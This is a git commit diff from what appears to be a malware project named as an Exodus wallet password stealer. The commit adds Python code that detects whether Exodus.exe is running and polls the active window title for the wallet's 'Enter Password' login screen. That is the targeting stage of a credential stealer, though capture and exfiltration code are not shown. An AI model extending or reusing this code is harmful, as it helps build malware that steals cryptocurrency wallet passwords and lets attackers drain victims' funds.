c35605642d4eff273ffe4a760df9a85d5b840199
NotKatsu <122122838+NotKatsu@users.noreply.github.com>
2023-05-27 11:48:46 +0100

    check if exodus is running and the login screen are open

--- stealer.py
+++ stealer.py
@@ -1,11 +1,32 @@
+import time
+
 from typing import Union
 from modules.tasks import Tasks
+from modules.current_window import Current_Window
 
 class Exodus_Password_Stealer:
-    def check_if_running(executable_name: str) -> Union[str, bool]:
-        is_running_result: any = Tasks.is_running(executable_name=executable_name)
+    def __init__(self, exectuable_name: str) -> None:
+        self.executable_name: str = exectuable_name
+        
+    def check_if_running(self) -> Union[str, bool]:
+        is_running_result: any = Tasks.is_running(executable_name=self.executable_name)
         
         if is_running_result == True or is_running_result == False:
             return is_running_result
         else:
-            return None
+            return None   
+        
+    def current_active_window(self) -> dict[str]:
+        return Current_Window.fetch_one()
+        
+if __name__ == "__main__":
+    Stealer_Object: object = Exodus_Password_Stealer("Exodus.exe")
+    
+    while True:
+        if Stealer_Object.check_if_running() == True:
+            current_active_window: dict[str] = Stealer_Object.current_active_window()
+            
+            if current_active_window["title"] == "Enter Password":
+                print("exodus login screen is open")
+            
+            time.sleep(0.5)
